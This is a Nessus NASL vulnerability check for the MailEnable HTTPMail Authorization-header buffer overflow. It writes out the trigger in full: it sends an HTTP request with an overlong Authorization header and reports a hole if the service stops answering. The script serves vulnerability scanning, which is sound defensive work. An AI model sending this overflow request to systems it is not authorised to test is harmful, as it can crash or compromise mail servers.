#
# (C) Tenable Network Security
#


if (description) {
  script_id(18123);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(13350);
  script_xref(name:"OSVDB", value:"15737");

  name["english"] = "MailEnable HTTPMail Service Authorization Buffer Overflow Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of MailEnable -
http://www.mailenable.com/ - that has a flaw in the HTTPMail service
(MEHTTPS.exe) in the Professional and Enterprise Editions.  The flaw
can be exploited by issuing an HTTP request with a malformed
Authorization header, which causes a buffer overflow in HTTPMail 
service. 
Successful exploitation will result in code execution on the remote
host.

Solution : Apply hotfix : HTTPMail Fix - For MailEnable Professional
           and Enterprise (65k) - 22nd April 2005.
See also : http://www.mailenable.com/hotfix/ 

Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Authorization Buffer Overflow Vulnerability in MailEnable HTTPMail Service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8080);
if ( ! port ) exit(0);

if(get_port_state(port))
{
 request = string ("GET / HTTP/1.1\r\nAuthorization: ", crap(data:"A", length:5), "\r\n\r\n");
 buf = http_keepalive_send_recv(port:port, data:request, bodyonly:0);
 if (("HTTP/1.1 401 Access Denied" >!< buf) || ("Server: MailEnable-HTTP/5.0" >!< buf))
   exit (0);

 request = string ("GET / HTTP/1.1\r\nAuthorization: ", crap(data:"A", length:280), "\r\n\r\n");
 buf = http_keepalive_send_recv(port:port, data:request, bodyonly:0);
 if (("HTTP/1.1 401 Access Denied" >!< buf) || ("Server: MailEnable-HTTP/5.0" >!< buf))
   security_hole (port);
}
